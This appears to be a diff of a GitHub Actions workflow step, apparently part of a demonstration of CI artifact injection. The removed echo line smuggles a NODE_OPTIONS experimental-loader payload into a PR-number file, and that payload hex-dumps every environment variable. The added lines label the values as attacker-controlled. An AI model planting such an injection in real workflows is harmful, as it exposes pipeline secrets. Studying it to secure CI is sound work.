@@ -13,12 +13,12 @@ jobs:
     steps:
       - name: Save PR Data
         env:
-          PR_NUMBER: "anupamas01"
-          PR_SHA: "anupamas01" # Set the desired value for PR_SHA
-          MERGE_SHA: "anupamas01" # Set the desired value for MERGE_SHA
+          PR_NUMBER: "THIS IS CONTROLLED BY AN ATTACKER"
+          PR_SHA: "THIS IS CONTROLLED BY AN ATTACKER" # Set the desired value for PR_SHA
+          MERGE_SHA: "THIS IS CONTROLLED BY AN ATTACKER" # Set the desired value for MERGE_SHA
         run: |
           mkdir -p ./pr
-          echo -e "11\nNODE_OPTIONS=--experimental-modules\n--experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));//" > ./pr/pr_number
+          echo "PR_NUMBER" > ./pr/pr_number
           echo $PR_SHA > ./pr/pr_sha
           echo $MERGE_SHA > ./pr/merge_sha
 
